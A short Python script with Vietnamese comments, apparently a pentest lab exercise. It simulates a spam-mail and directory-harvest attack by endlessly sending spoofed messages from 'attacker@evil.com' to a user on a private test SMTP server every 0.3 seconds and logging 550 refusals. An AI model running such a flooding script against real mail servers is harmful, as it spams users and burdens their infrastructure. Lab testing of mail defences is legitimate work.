import smtplib
import time

SERVER_IP = "10.20.0.147"  # Thay bằng IP thực tế của Tiên
PORT = 25

def run_smtp_spam():
    print(f"[!] Bắt đầu kịch bản giả lập Spam Mail / Directory Harvest Attack...")
    count = 0
    
    while True:
        try:
            count += 1
            # Kết nối tới dịch vụ SMTP thô không mã hóa
            server = smtplib.SMTP(SERVER_IP, PORT, timeout=2)
            
            sender = "attacker@evil.com"

            receiver = "user03@company.local"
            
            message = f"Subject: Spam Mail Test {count}\n\nNoi dung thu rac tu kich ban Pentest."
            
            # Thực hiện lệnh gửi
            server.sendmail(sender, receiver, message)
            print(f"[+] Lượt {count}: Đã bắn mail rác tới -> {receiver}")
            server.quit()
        except smtplib.SMTPRecipientsRefused:
            print(f"[+] Lượt {count}: Server của Tiên đã từ chối nhận (Mã lỗi 550 - User unknown)")
        except Exception as e:
            print(f"[-] Lỗi: {e}")
            
        time.sleep(0.3)

if __name__ == "__main__":
    run_smtp_spam()
